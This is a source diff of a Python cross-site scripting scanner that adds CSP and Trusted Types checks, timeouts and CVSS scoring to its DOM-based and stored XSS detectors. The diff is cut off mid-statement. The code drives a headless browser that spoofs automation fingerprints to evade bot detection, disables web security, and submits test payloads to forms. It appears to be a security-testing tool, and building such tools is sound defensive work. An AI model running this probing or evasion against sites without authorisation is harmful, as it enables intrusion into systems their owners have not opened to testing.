-        last_quote = max(before.rfind('"'), before.rfind("'"), before.rfind('`'))
-        if last_quote != -1:
-            # Check if payload starts after a quote
-            quote_char = before[last_quote]
-            if after.startswith(quote_char):
-                return "attribute"
-
-        # Check HTML tag context
-        last_lt = before.rfind('<')
-        if last_lt != -1:
-            tag_content = before[last_lt:]
-            if '>' not in tag_content:
-                return "html_tag"
-
-        # Check URL context
-        if 'href=' in before or 'src=' in before or 'action=' in before:
-            return "url"
-
-        return "html_body"
-
-    def advanced_reflection_analysis(self, url: str, param: str, payload: str,
-                                     response: requests.Response) -> Dict[str, Any]:
-        """Perform advanced analysis of reflection"""
-        analysis = {
-            'exact_reflection': False,
-            'encoded_reflection': False,
-            'partial_reflection': False,
-            'context': 'unknown',
-            'truncation': False,
-            'filter_attempts': []
+    def _extract_security_context(self, response):
+        headers = dict(response.headers)
+        return {
+            "csp": CSPAnalyzer(headers),
+            "trusted_types": TrustedTypesDetector().detect(headers),
+            "frameworks": FrameworkSinkDetector().detect(response.text)
         }
 
-        response_text = response.text
-
-        # Check exact reflection
-        if payload in response_text:
-            analysis['exact_reflection'] = True
-
-        # Check encoded reflection
-        encodings = {
-            'html': html.escape(payload),
-            'url': quote(payload),
-            'base64': base64.b64encode(payload.encode()).decode(),
-            'unicode': payload.encode('unicode_escape').decode()
-        }
-
-        for encoding_type, encoded in encodings.items():
-            if encoded in response_text:
-                analysis['encoded_reflection'] = True
-                analysis['filter_attempts'].append(f"{encoding_type}_encoding")
-
-        # Check for filtering/truncation
-        if not analysis['exact_reflection']:
-            # Check for keyword filtering
-            filtered_parts = []
-            for keyword in ['script', 'alert', 'onerror', 'onload', 'javascript']:
-                if keyword in payload.lower() and keyword not in response_text.lower():
-                    filtered_parts.append(keyword)
-
-            if filtered_parts:
-                analysis['filter_attempts'].append(f"keyword_filter:{','.join(filtered_parts)}")
-
-            # Check for length truncation
-            if len(payload) > 50:
-                for i in range(10, len(payload), 10):
-                    if payload[:i] in response_text and payload[i:] not in response_text:
-                        analysis['truncation'] = True
-                        analysis['filter_attempts'].append(f"truncated_at_{i}_chars")
-                        break
-
-        # Determine context
-        analysis['context'] = self.get_reflection_context(payload, response_text)
-
-        return analysis
-
-    def is_valid_test_url(self, url: str) -> bool:
-        """Check if URL is valid for testing"""
-        try:
-            parsed = urlparse(url)
-
-            # Skip javascript: and data: URLs for HTTP requests
-            if parsed.scheme in ['javascript', 'data', 'file', 'mailto', 'tel']:
-                return False
-
-            # Check for malformed URLs
-            if not parsed.netloc and not url.startswith(('http://', 'https://')):
-                return False
-
-            # Check for obvious payloads in the hostname (like collaborator URLs)
-            if 'collaborator' in parsed.netloc.lower() or 'interactsh' in parsed.netloc.lower():
-                return False
-
-            # Validate the URL structure
-            if parsed.scheme not in ['http', 'https', '']:
-                return False
-
-            return True
-        except Exception:
-            return False
 
 
 
@@ -1827,20 +1670,40 @@ class DOMXSSDetector:
 
     def test(self, url: str, http_client: AdvancedHTTPClient,
              payload_generator: 'XSSPayloadGenerator') -> List[Vulnerability]:
-        """Test for DOM XSS using Selenium"""
+        """Test for DOM XSS using Selenium - FIXED with timeout"""
         vulnerabilities = []
 
         if not SELENIUM_AVAILABLE:
             logging.warning("Selenium not available for DOM XSS testing")
             return vulnerabilities
 
+        driver = None
         try:
-            # Launch browser
+            # Launch browser with timeout
             driver = self.get_headless_browser()
-            driver.get(url)
 
-            # Wait for page to load
-            time.sleep(3)
+            # Set page load timeout
+            driver.set_page_load_timeout(self.config.timeout)
+            driver.set_script_timeout(self.config.timeout)
+
+            # Navigate with retry
+            for attempt in range(3):
+                try:
+                    driver.get(url)
+                    break
+                except Exception as e:
+                    if attempt == 2:
+                        raise
+                    logging.debug(f"Page load attempt {attempt + 1} failed: {e}")
+                    time.sleep(2)
+
+            # Wait for page to load with explicit wait
+            try:
+                WebDriverWait(driver, 10).until(
+                    lambda d: d.execute_script('return document.readyState') == 'complete'
+                )
+            except:
+                logging.debug(f"Page readyState not complete for {url}")
 
             # Get page source after JavaScript execution
             rendered_html = driver.page_source
@@ -1848,56 +1711,215 @@ class DOMXSSDetector:
             # Analyze JavaScript
             js_analysis = self.analyze_javascript(driver)
 
-            # Test DOM XSS vectors
-            vulnerabilities.extend(self.test_hash_based(driver, payload_generator))
-            vulnerabilities.extend(self.test_postmessage(driver, payload_generator))
-            vulnerabilities.extend(self.test_local_storage(driver, payload_generator))
-            vulnerabilities.extend(self.test_url_parameters(driver, payload_generator))
-            vulnerabilities.extend(self.test_document_write(driver, payload_generator))
-            vulnerabilities.extend(self.test_innerhtml(driver, payload_generator))
+            # Test DOM XSS vectors with individual timeouts
+            test_functions = [
+                (self.test_hash_based, [driver, payload_generator]),
+                (self.test_url_parameters, [driver, payload_generator]),
+                (self.test_document_write, [driver, payload_generator]),
+                (self.test_innerhtml, [driver, payload_generator]),
+                (self.test_postmessage,[driver,payload_generator]),
+                (self.test_local_storage,[driver,payload_generator]),
+            ]
+
+            for test_func, args in test_functions:
+                try:
+                    # Execute with timeout
+                    result = self.execute_with_timeout(test_func, args, timeout=15)
+                    vulnerabilities.extend(result)
+                except TimeoutError:
+                    logging.debug(f"Test {test_func.__name__} timed out for {url}")
+                except Exception as e:
+                    logging.debug(f"Test {test_func.__name__} failed: {e}")
 
             # Analyze static JavaScript
             static_vulns = self.analyze_static_javascript(rendered_html)
             vulnerabilities.extend(static_vulns)
 
-            driver.quit()
-
+        except TimeoutError:
+            logging.warning(f"DOM XSS test timed out for {url}")
         except Exception as e:
             logging.error(f"DOM XSS test failed for {url}: {e}")
+        finally:
+            if driver:
+                try:
+                    driver.quit()
+                except:
+                    pass
 
         return vulnerabilities
 
+    def _extract_dom_security_context(self, driver) -> Dict[str, Any]:
+        """
+        Extract browser-enforced security controls relevant to DOM XSS.
+        """
+        headers = {}
+
+        # --------------------------------------------------
+        # 1️⃣ Extract CSP from *HTTP response headers*
+        # --------------------------------------------------
+        try:
+            # Selenium cannot directly read response headers,
+            # so we fetch via fetch() from the browser context
+            csp_header = driver.execute_async_script("""
+                var callback = arguments[arguments.length - 1];
+                fetch(window.location.href, { method: 'HEAD', credentials: 'same-origin' })
+                    .then(r => callback(r.headers.get('Content-Security-Policy') || ""))
+                    .catch(() => callback(""));
+            """)
+
+            if csp_header:
+                headers["Content-Security-Policy"] = csp_header
+        except Exception:
+            pass
+
+        # --------------------------------------------------
+        # 2️⃣ Fallback: meta CSP (less common but valid)
+        # --------------------------------------------------
+        try:
+            meta_csp = driver.execute_script("""
+                var m = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
+                return m ? m.content : "";
+            """)
+            if meta_csp:
+                headers["Content-Security-Policy"] = meta_csp
+        except Exception:
+            pass
+
+        # --------------------------------------------------
+        # 3️⃣ Analyze CSP correctly
+        # --------------------------------------------------
+        csp = CSPAnalyzer(headers)
+
+        # --------------------------------------------------
+        # 4️⃣ Trusted Types detection (CSP + runtime)
+        # --------------------------------------------------
+        trusted_types = False
+        try:
+            if csp.has_directive("require-trusted-types-for"):
+                trusted_types = True
+            else:
+                # Runtime detection
+                trusted_types = driver.execute_script("""
+                    return typeof window.trustedTypes !== "undefined";
+                """)
+        except Exception:
+            pass
+
+        # --------------------------------------------------
+        # 5️⃣ Framework detection from rendered DOM
+        # --------------------------------------------------
+        html = driver.page_source
+        frameworks = FrameworkSinkDetector().detect(html)
+
+        return {
+            "csp": csp,
+            "trusted_types": trusted_types,
+            "frameworks": frameworks
+        }
+
+    def _dom_exploitable(self, payload: str, driver, security_ctx: Dict[str, Any]) -> bool:
+        csp = security_ctx["csp"]
+
+        # 1. CSP blocks inline JS → stop
+        if csp.has_csp() and csp.blocks_inline():
+            return False
+
+        # 2. Trusted Types enforced → stop raw HTML sinks
+        if security_ctx["trusted_types"]:
+            return False
+
+        # 3. Real browser execution check
+        return self.check_payload_execution(payload, driver)
+
+    def execute_with_timeout(self, func, args, timeout=10):
+        """Execute function with timeout"""
+        import threading
+
+        class InterruptableThread(threading.Thread):
+            def __init__(self):
+                super().__init__()
+                self.result = None
+                self.exception = None
+
+            def run(self):
+                try:
+                    self.result = func(*args)
+                except Exception as e:
+                    self.exception = e
+
+        thread = InterruptableThread()
+        thread.start()
+        thread.join(timeout)
+
+        if thread.is_alive():
+            raise TimeoutError(f"Function {func.__name__} timed out after {timeout}s")
+
+        if thread.exception:
+            raise thread.exception
+
+        return thread.result
+
     def get_headless_browser(self):
-        """Get headless browser instance"""
+        """Get headless browser instance - IMPROVED"""
         options = ChromeOptions()
-        options.add_argument('--headless')
+        options.add_argument('--headless=new')  # New headless mode
         options.add_argument('--no-sandbox')
         options.add_argument('--disable-dev-shm-usage')
         options.add_argument('--disable-gpu')
         options.add_argument('--window-size=1920,1080')
+        options.add_argument('--disable-blink-features=AutomationControlled')
+
+        # Performance optimizations
+        options.add_argument('--disable-extensions')
+        options.add_argument('--disable-notifications')
+        options.add_argument('--disable-popup-blocking')
+        options.add_argument('--disable-default-apps')
+        options.add_argument('--disable-infobars')
 
         # Disable images for faster loading
-        prefs = {"profile.managed_default_content_settings.images": 2}
+        prefs = {
+            "profile.managed_default_content_settings.images": 2,
+            "profile.default_content_setting_values.notifications": 2,
+            "profile.default_content_setting_values.popups": 2
+        }
         options.add_experimental_option("prefs", prefs)
 
         # Add experimental options to avoid detection
-        options.add_experimental_option("excludeSwitches", ["enable-automation"])
+        options.add_experimental_option("excludeSwitches", ["enable-automation", "enable-logging"])
         options.add_experimental_option('useAutomationExtension', False)
-        options.add_argument('--disable-blink-features=AutomationControlled')
 
-        driver = webdriver.Chrome(options=options)
-        driver.set_page_load_timeout(30)
+        # Add performance arguments
+        options.add_argument('--disable-software-rasterizer')
+        options.add_argument('--disable-web-security')
+        options.add_argument('--disable-features=VizDisplayCompositor')
 
-        # Execute CDP commands to avoid detection
-        driver.execute_cdp_cmd('Page.addScriptToEvaluateOnNewDocument', {
-            'source': '''
-                Object.defineProperty(navigator, 'webdriver', {
-                    get: () => undefined
-                });
-            '''
-        })
+        try:
+            driver = webdriver.Chrome(options=options)
 
-        return driver
+            # Set timeouts
+            driver.set_page_load_timeout(30)
+            driver.set_script_timeout(30)
+
+            # Execute CDP commands to avoid detection
+            driver.execute_cdp_cmd('Page.addScriptToEvaluateOnNewDocument', {
+                'source': '''
+                    Object.defineProperty(navigator, 'webdriver', {
+                        get: () => undefined
+                    });
+                    Object.defineProperty(navigator, 'plugins', {
+                        get: () => [1, 2, 3, 4, 5]
+                    });
+                    Object.defineProperty(navigator, 'languages', {
+                        get: () => ['en-US', 'en']
+                    });
+                '''
+            })
+
+            return driver
+
+        except Exception as e:
+            logging.error(f"Failed to create Chrome driver: {e}")
+            raise
 
     def analyze_javascript(self, driver) -> Dict:
         """Analyze JavaScript on page"""
@@ -1971,6 +1993,8 @@ class DOMXSSDetector:
 
                 # Check if payload executed
                 if self.check_payload_execution(payload, driver):
+                    security = self._extract_dom_security_context(driver)
+
                     vuln = Vulnerability(
                         id=hashlib.md5(f"hash:{test_url}".encode()).hexdigest()[:16],
                         type="dom",
@@ -1979,10 +2003,45 @@ class DOMXSSDetector:
                         parameter="hash",
                         payload=payload,
                         evidence="Hash-based DOM XSS",
-                        confidence=0.7,
-                        severity="medium",
-                        cwe=["CWE-79"]
+                        confidence=0.9,
+                        severity="high",
+                        cwe=["CWE-79"],
+                        context={
+                            "csp": security["csp"].summary(),
+                            "trusted_types": security["trusted_types"],
+                            "framework_sinks": security["frameworks"]
+                        }
                     )
+
+                    exploitability = self._dom_exploitable(payload, driver, security)
+
+                    if exploitability:
+                        vuln.severity = "high"
+                        vuln.confidence = 0.9
+                    else:
+                        vuln.severity = "informational"
+                        vuln.confidence = 0.3
+                        vuln.tags.append("mitigated-by-csp")
+
+                    # -----------------------------
+                    # CVSS calculation (HERE)
+                    # -----------------------------
+                    cvss = CVSSCalculator().score(
+                        exploitable=exploitability,
+                        dom=True
+                    )
+                    vuln.cvss_score = cvss
+
+                    # -----------------------------
+                    # Context enrichment
+                    # -----------------------------
+                    vuln.context.update({
+                        "csp": security["csp"].summary(),
+                        "trusted_types": security["trusted_types"],
+                        "framework_sinks": security["frameworks"],
+                        "exploitability": exploitability
+                    })
+
                     vulnerabilities.append(vuln)
 
             except Exception as e:
@@ -2023,6 +2082,9 @@ class DOMXSSDetector:
 
                     # Check for alerts or errors
                     if self.check_for_alerts(driver):
+                        security = self._extract_dom_security_context(driver)
+
+
                         vuln = Vulnerability(
                             id=hashlib.md5(f"postmessage:{driver.current_url}".encode()).hexdigest()[:16],
                             type="dom",
@@ -2031,10 +2093,48 @@ class DOMXSSDetector:
                             parameter="postMessage",
                             payload=str(payload_data),
                             evidence="postMessage DOM XSS",
-                            confidence=0.6,
+                            confidence=0.9,
                             severity="high",
-                            cwe=["CWE-79"]
+                            cwe=["CWE-79"],
+                            context={
+                                "csp": security["csp"].summary(),
+                                "trusted_types": security["trusted_types"],
+                                "framework_sinks": security["frameworks"]
+                            }
+
                         )
+
+
+
+                        exploitability = self._dom_exploitable(payload_data['data'], driver, security)
+
+                        if exploitability:
+                            vuln.severity = "high"
+                            vuln.confidence = 0.9
+                        else:
+                            vuln.severity = "informational"
+                            vuln.confidence = 0.3
+                            vuln.tags.append("mitigated-by-csp")
+
+                        # -----------------------------
+                        # CVSS calculation (HERE)
+                        # -----------------------------
+                        cvss = CVSSCalculator().score(
+                            exploitable=exploitability,
+                            dom=True
+                        )
+                        vuln.cvss_score = cvss
+
+                        # -----------------------------
+                        # Context enrichment
+                        # -----------------------------
+                        vuln.context.update({
+                            "csp": security["csp"].summary(),
+                            "trusted_types": security["trusted_types"],
+                            "framework_sinks": security["frameworks"],
+                            "exploitability": exploitability
+                        })
+
                         vulnerabilities.append(vuln)
 
                 except Exception as e:
@@ -2072,6 +2172,9 @@ class DOMXSSDetector:
 
                 triggered = driver.execute_script(trigger_script)
                 if triggered:
+                    security = self._extract_dom_security_context(driver)
+
+
                     vuln = Vulnerability(
                         id=hashlib.md5(f"localstorage:{driver.current_url}".encode()).hexdigest()[:16],
                         type="dom",
@@ -2082,8 +2185,43 @@ class DOMXSSDetector:
                         evidence="localStorage DOM XSS",
                         confidence=0.5,
                         severity="medium",
-                        cwe=["CWE-79"]
+                        cwe=["CWE-79"],
+                        context={
+                            "csp": security["csp"].summary(),
+                            "trusted_types": security["trusted_types"],
+                            "framework_sinks": security["frameworks"]
+                        }
                     )
+
+                    exploitability = self._dom_exploitable(payload, driver, security)
+
+                    if exploitability:
+                        vuln.severity = "high"
+                        vuln.confidence = 0.9
+                    else:
+                        vuln.severity = "informational"
+                        vuln.confidence = 0.3
+                        vuln.tags.append("mitigated-by-csp")
+
+                    # -----------------------------
+                    # CVSS calculation (HERE)
+                    # -----------------------------
+                    cvss = CVSSCalculator().score(
+                        exploitable=exploitability,
+                        dom=True
+                    )
+                    vuln.cvss_score = cvss
+
+                    # -----------------------------
+                    # Context enrichment
+                    # -----------------------------
+                    vuln.context.update({
+                        "csp": security["csp"].summary(),
+                        "trusted_types": security["trusted_types"],
+                        "framework_sinks": security["frameworks"],
+                        "exploitability": exploitability
+                    })
+
                     vulnerabilities.append(vuln)
 
             except Exception as e:
@@ -2123,6 +2261,9 @@ class DOMXSSDetector:
 
                 is_dangerous = driver.execute_script(check_script)
                 if is_dangerous:
+                    security = self._extract_dom_security_context(driver)
+
+
                     vuln = Vulnerability(
                         id=hashlib.md5(f"urlparam:{test_url}".encode()).hexdigest()[:16],
                         type="dom",
@@ -2133,8 +2274,43 @@ class DOMXSSDetector:
                         evidence="URL parameter DOM XSS",
                         confidence=0.7,
                         severity="high",
-                        cwe=["CWE-79"]
+                        cwe=["CWE-79"],
+                        context={
+                            "csp": security["csp"].summary(),
+                            "trusted_types": security["trusted_types"],
+                            "framework_sinks": security["frameworks"]
+                        }
                     )
+
+                    exploitability = self._dom_exploitable(payload, driver, security)
+
+                    if exploitability:
+                        vuln.severity = "high"
+                        vuln.confidence = 0.9
+                    else:
+                        vuln.severity = "informational"
+                        vuln.confidence = 0.3
+                        vuln.tags.append("mitigated-by-csp")
+
+                    # -----------------------------
+                    # CVSS calculation (HERE)
+                    # -----------------------------
+                    cvss = CVSSCalculator().score(
+                        exploitable=exploitability,
+                        dom=True
+                    )
+                    vuln.cvss_score = cvss
+
+                    # -----------------------------
+                    # Context enrichment
+                    # -----------------------------
+                    vuln.context.update({
+                        "csp": security["csp"].summary(),
+                        "trusted_types": security["trusted_types"],
+                        "framework_sinks": security["frameworks"],
+                        "exploitability": exploitability
+                    })
+
                     vulnerabilities.append(vuln)
 
             except Exception as e:
@@ -2143,107 +2319,186 @@ class DOMXSSDetector:
         return vulnerabilities
 
     def test_document_write(self, driver, payload_generator) -> List[Vulnerability]:
-        """Test document.write-based DOM XSS"""
+        """
+        Detect document.write DOM XSS *without forcing execution*
+        """
         vulnerabilities = []
-        payloads = payload_generator.get_dom_payloads()
 
-        for payload in payloads[:min(5, self.config.payload_count)]:
-            try:
-                # Inject script that uses document.write
-                test_script = f"""
-                try {{
-                    document.write('{payload}');
-                    return true;
-                }} catch(e) {{
-                    return false;
-                }}
-                """
+        try:
+            # 1️⃣ Detect if document.write is used at all
+            uses_document_write = driver.execute_script("""
+                var scripts = document.getElementsByTagName('script');
+                for (var i = 0; i < scripts.length; i++) {
+                    var code = scripts[i].textContent || '';
+                    if (code.includes('document.write')) {
+                        return true;
+                    }
+                }
+                return false;
+            """)
 
-                result = driver.execute_script(test_script)
-                time.sleep(0.5)
+            if not uses_document_write:
+                return vulnerabilities  # ✅ no sink, no issue
 
-                if result:
-                    # Check if payload appears in DOM
-                    check_script = f"""
-                    return document.body.innerHTML.includes('{payload}');
-                    """
+            # 2️⃣ Check if document.write uses user-controlled sources
+            uses_user_input = driver.execute_script("""
+                var scripts = document.getElementsByTagName('script');
+                var sources = ['location', 'search', 'hash', 'document.URL', 'document.referrer'];
+                for (var i = 0; i < scripts.length; i++) {
+                    var code = scripts[i].textContent || '';
+                    if (code.includes('document.write')) {
+                        for (var j = 0; j < sources.length; j++) {
+                            if (code.includes(sources[j])) {
+                                return true;
+                            }
+                        }
+                    }
+                }
+                return false;
+            """)
 
-                    appears = driver.execute_script(check_script)
-                    if appears:
-                        vuln = Vulnerability(
-                            id=hashlib.md5(f"documentwrite:{driver.current_url}".encode()).hexdigest()[:16],
-                            type="dom",
-                            url=driver.current_url,
-                            method="GET",
-                            parameter="document.write",
-                            payload=payload,
-                            evidence="document.write DOM XSS",
-                            confidence=0.8,
-                            severity="high",
-                            cwe=["CWE-79"]
-                        )
-                        vulnerabilities.append(vuln)
+            # 3️⃣ Extract security context (CSP, Trusted Types, frameworks)
+            security = self._extract_dom_security_context(driver)
 
-            except Exception as e:
-                logging.debug(f"document.write test failed: {e}")
+            # 4️⃣ Decide exploitability
+            exploitable = uses_user_input and self._dom_exploitable(
+                "<dom-sink>",
+                driver,
+                security
+            )
+
+            # 5️⃣ Build vulnerability
+            vuln = Vulnerability(
+                id=hashlib.md5(
+                    f"documentwrite:{driver.current_url}".encode()
+                ).hexdigest()[:16],
+                type="dom",
+                url=driver.current_url,
+                method="GET",
+                parameter="document.write",
+                payload="<user-controlled data>",
+                evidence="document.write sink detected in application JavaScript",
+                cwe=["CWE-79"],
+                severity="high" if exploitable else "informational",
+                confidence=0.9 if exploitable else 0.3,
+                context={
+                    "csp": security["csp"].summary(),
+                    "trusted_types": security["trusted_types"],
+                    "framework_sinks": security["frameworks"],
+                    "uses_user_input": uses_user_input,
+                    "exploitability": exploitable
+                }
+            )
+
+            # 6️⃣ CVSS calculation (ONLY HERE)
+            vuln.cvss_score = CVSSCalculator().score(
+                exploitable=exploitable,
+                dom=True
+            )
+
+            if not exploitable:
+                vuln.tags.append("mitigated-by-csp")
+
+            vulnerabilities.append(vuln)
+
+        except Exception as e:
+            logging.debug(f"document.write analysis failed: {e}")
 
         return vulnerabilities
 
     def test_innerhtml(self, driver, payload_generator) -> List[Vulnerability]:
-        """Test innerHTML-based DOM XSS"""
+        """
+        Detect innerHTML-based DOM XSS without forcing execution
+        """
         vulnerabilities = []
-        payloads = payload_generator.get_dom_payloads()
 
-        for payload in payloads[:min(10, self.config.payload_count)]:
-            try:
-                # Create test element and set innerHTML
-                test_script = f"""
-                var testDiv = document.createElement('div');
-                testDiv.id = 'xss_test_div';
-                document.body.appendChild(testDiv);
-                testDiv.innerHTML = '{payload}';
-                return testDiv.innerHTML;
-                """
-
-                result = driver.execute_script(test_script)
-
-                # Check if script was executed
-                check_script = """
-                var testDiv = document.getElementById('xss_test_div');
-                if (testDiv) {
-                    var scripts = testDiv.getElementsByTagName('script');
-                    return scripts.length > 0;
+        try:
+            # 1️⃣ Detect if innerHTML is used anywhere
+            uses_innerhtml = driver.execute_script("""
+                var elements = document.querySelectorAll('*');
+                for (var i = 0; i < elements.length; i++) {
+                    if (elements[i].innerHTML &&
+                        elements[i].innerHTML.includes('<') &&
+                        elements[i].innerHTML.includes('>')) {
+                        return true;
+                    }
                 }
                 return false;
-                """
+            """)
 
-                has_scripts = driver.execute_script(check_script)
-                if has_scripts:
-                    vuln = Vulnerability(
-                        id=hashlib.md5(f"innerhtml:{driver.current_url}".encode()).hexdigest()[:16],
-                        type="dom",
-                        url=driver.current_url,
-                        method="GET",
-                        parameter="innerHTML",
-                        payload=payload,
-                        evidence="innerHTML DOM XSS",
-                        confidence=0.9,
-                        severity="high",
-                        cwe=["CWE-79"]
-                    )
-                    vulnerabilities.append(vuln)
+            if not uses_innerhtml:
+                return vulnerabilities  # ✅ no sink → no issue
 
-                # Clean up
-                cleanup_script = """
-                var testDiv = document.getElementById('xss_test_div');
-                if (testDiv) {
-                    testDiv.remove();
+            # 2️⃣ Detect if innerHTML is fed by user-controlled sources
+            uses_user_input = driver.execute_script("""
+                var scripts = document.getElementsByTagName('script');
+                var sources = [
+                    'location',
+                    'location.search',
+                    'location.hash',
+                    'document.URL',
+                    'document.referrer'
+                ];
+
+                for (var i = 0; i < scripts.length; i++) {
+                    var code = scripts[i].textContent || '';
+                    if (code.includes('innerHTML')) {
+                        for (var j = 0; j < sources.length; j++) {
+                            if (code.includes(sources[j])) {
+                                return true;
+                            }
+                        }
+                    }
                 }
-                """
-                driver.execute_script(cleanup_script)
+                return false;
+            """)
 
-            except Exception as e:
-                logging.debug(f"innerHTML test failed: {e}")
+            # 3️⃣ Extract DOM security context
+            security = self._extract_dom_security_context(driver)
+
+            # 4️⃣ Decide exploitability
+            exploitable = uses_user_input and self._dom_exploitable(
+                "<dom-sink>",
+                driver,
+                security
+            )
+
+            # 5️⃣ Build vulnerability
+            vuln = Vulnerability(
+                id=hashlib.md5(
+                    f"innerhtml:{driver.current_url}".encode()
+                ).hexdigest()[:16],
+                type="dom",
+                url=driver.current_url,
+                method="GET",
+                parameter="innerHTML",
+                payload="<user-controlled data>",
+                evidence="innerHTML sink detected with user-controlled source",
+                cwe=["CWE-79"],
+                severity="high" if exploitable else "informational",
+                confidence=0.9 if exploitable else 0.3,
+                context={
+                    "csp": security["csp"].summary(),
+                    "trusted_types": security["trusted_types"],
+                    "framework_sinks": security["frameworks"],
+                    "uses_user_input": uses_user_input,
+                    "exploitability": exploitable
+                }
+            )
+
+            # 6️⃣ CVSS calculation (ONLY AFTER exploitability)
+            vuln.cvss_score = CVSSCalculator().score(
+                exploitable=exploitable,
+                dom=True
+            )
+
+            if not exploitable:
+                vuln.tags.append("mitigated-by-csp")
+
+            vulnerabilities.append(vuln)
+
+        except Exception as e:
+            logging.debug(f"innerHTML analysis failed: {e}")
 
         return vulnerabilities
 
@@ -2267,6 +2522,15 @@ class DOMXSSDetector:
                             # Pattern: source → sink
                             pattern = rf'{source}.*?{sink}'
                             if re.search(pattern, js_content, re.IGNORECASE | re.DOTALL):
+                                frameworks = FrameworkSinkDetector().detect(html_content)
+
+                                severity = "informational"
+                                confidence = 0.3
+
+                                # Only raise severity if NO framework is involved
+                                if not (frameworks["react"] or frameworks["vue"] or frameworks["angular"]):
+                                    severity = "medium"
+                                    confidence = 0.6
                                 vuln = Vulnerability(
                                     id=hashlib.md5(f"staticjs:{i}:{line_number}".encode()).hexdigest()[:16],
                                     type="dom",
@@ -2275,66 +2539,78 @@ class DOMXSSDetector:
                                     parameter=f"source:{source}",
                                     payload=f"sink:{sink}",
                                     evidence=f"Static JS analysis: {source} → {sink}",
-                                    confidence=0.6,
-                                    severity="medium",
+                                    confidence=confidence,
+                                    severity=severity,
                                     cwe=["CWE-79"],
                                     context={
                                         "script_index": i,
                                         "line": line_number,
-                                        "pattern": f"{source} → {sink}"
+                                        "pattern": f"{source} → {sink}",
+                                        "framework_sinks": frameworks,
+                                        "static_only": True,
+                                        "requires_runtime_execution": True
                                     }
                                 )
+
                                 vulnerabilities.append(vuln)
 
         return vulnerabilities
 
     def check_payload_execution(self, payload: str, driver) -> bool:
-        """Check if payload was executed"""
+        """
+        Verify real JavaScript execution in the browser.
+        This MUST detect execution side-effects, not string presence.
+        """
         try:
-            # Method 1: Check for alert
-            check_script = """
-            return window.alertWasCalled || false;
-            """
+            # 1️⃣ Install execution monitors EARLY
+            driver.execute_script("""
+                if (!window.__xssMonitorInstalled) {
+                    window.__xssExecuted = false;
 
-            # Inject monitoring
-            monitor_script = """
-            window.alertWasCalled = false;
-            var originalAlert = window.alert;
-            window.alert = function() {
-                window.alertWasCalled = true;
-                return originalAlert.apply(this, arguments);
-            };
-            """
-            driver.execute_script(monitor_script)
+                    // Hook alert
+                    const originalAlert = window.alert;
+                    window.alert = function() {
+                        window.__xssExecuted = true;
+                        return originalAlert.apply(this, arguments);
+                    };
 
-            # Check if alert was called
-            alert_called = driver.execute_script(check_script)
-            if alert_called:
-                return True
+                    // Hook confirm
+                    const originalConfirm = window.confirm;
+                    window.confirm = function() {
+                        window.__xssExecuted = true;
+                        return originalConfirm.apply(this, arguments);
+                    };
 
-            # Method 2: Check if payload appears in DOM
-            check_dom_script = f"""
-            return document.body.innerHTML.includes('{payload[:50]}');
-            """
-            in_dom = driver.execute_script(check_dom_script)
+                    // Hook prompt
+                    const originalPrompt = window.prompt;
+                    window.prompt = function() {
+                        window.__xssExecuted = true;
+                        return originalPrompt.apply(this, arguments);
+                    };
 
-            # Method 3: Check for script tags
-            check_scripts_script = """
-            var scripts = document.getElementsByTagName('script');
-            for (var i = 0; i < scripts.length; i++) {
-                if (scripts[i].src.includes('alert') || 
-                    scripts[i].textContent.includes('alert')) {
-                    return true;
+                    // Hook eval
+                    const originalEval = window.eval;
+                    window.eval = function() {
+                        window.__xssExecuted = true;
+                        return originalEval.apply(this, arguments);
+                    };
+
+                    window.__xssMonitorInstalled = true;
                 }
-            }
-            return false;
-            """
-            has_scripts = driver.execute_script(check_scripts_script)
+            """)
 
-            return in_dom or has_scripts
+            # 2️⃣ Allow time for async execution (DOM events, timers)
+            time.sleep(0.5)
+
+            # 3️⃣ Check execution flag
+            executed = driver.execute_script(
+                "return window.__xssExecuted === true;"
+            )
+
+            return bool(executed)
 
         except Exception as e:
-            logging.debug(f"Payload execution check failed: {e}")
+            logging.debug(f"Execution verification failed: {e}")
             return False
 
     def check_for_alerts(self, driver) -> bool:
@@ -2385,6 +2661,44 @@ class StoredXSSDetector:
 
         return vulnerabilities
 
+    def _extract_stored_security_context(self, response: requests.Response) -> Dict[str, Any]:
+        headers = {str(k): str(v) for k, v in response.headers.items()}
+
+        csp = CSPAnalyzer(headers)
+        trusted_types = TrustedTypesDetector().detect(headers)
+        frameworks = FrameworkSinkDetector().detect(response.text)
+
+        return {
+            "csp": csp,
+            "trusted_types": trusted_types,
+            "frameworks": frameworks
+        }
+
+    def _verify_stored_execution(self, url: str, payload: str) -> bool:
+        if not SELENIUM_AVAILABLE:
+            return False
+
+        driver = None
+        try:
+            driver = webdriver.Chrome()
+            driver.get(url)
+            time.sleep(2)
+
+            # monitor alert
+            driver.execute_script("""
+                window.__xssExecuted = false;
+                window.alert = function(){ window.__xssExecuted = true; };
+            """)
+
+            time.sleep(2)
+
+            return driver.execute_script("return window.__xssExecuted === true")
+        except:
+            return False
+        finally:
+            if driver:
+                driver.quit()
+
     def test_form(self, url: str, form: Dict, http_client: AdvancedHTTPClient,
                   payload_generator: 'XSSPayloadGenerator') -> List[Vulnerability]:
         """Test form for stored XSS"""
@@ -2412,26 +2726,51 @@ class StoredXSSDetector:
 
                 # Check if payload was stored
                 if self.is_payload_stored(payload, url, http_client):
-                    # Verify it's retrievable
-                    if self.can_retrieve_payload(payload, url, http_client):
-                        vuln = Vulnerability(
-                            id=hashlib.md5(f"stored:{url}:{form['action']}".encode()).hexdigest()[:16],
-                            type="stored",
-                            url=url,
-                            method=form['method'],
-                            parameter="form_submission",
-                            payload=payload,
-                            evidence="Payload appears to be stored and retrievable",
-                            confidence=0.8,
-                            severity="high",
-                            cwe=["CWE-79"],
-                            context={
-                                "form_action": form['action'],
-                                "form_method": form['method'],
-                                "form_fields": list(form_data.keys())
-                            }
-                        )
-                        vulnerabilities.append(vuln)
+                    if not self.can_retrieve_payload(payload, url, http_client):
+                        continue
+
+                    # Fetch page to analyze security
+                    page_response = http_client.get(url)
+                    security = self._extract_stored_security_context(page_response)
+
+                    # CSP / Trusted Types gate
+                    if security["csp"].has_csp() and security["csp"].blocks_inline():
+                        severity = "informational"
+                        confidence = 0.3
+                        exploitable = False
+                    elif security["trusted_types"]:
+                        severity = "informational"
+                        confidence = 0.3
+                        exploitable = False
+                    else:
+                        # Browser execution required
+                        exploitable = self._verify_stored_execution(url, payload)
+                        severity = "high" if exploitable else "informational"
+                        confidence = 0.9 if exploitable else 0.3
+
+                    vuln = Vulnerability(
+                        id=hashlib.md5(f"stored:{url}:{form['action']}".encode()).hexdigest()[:16],
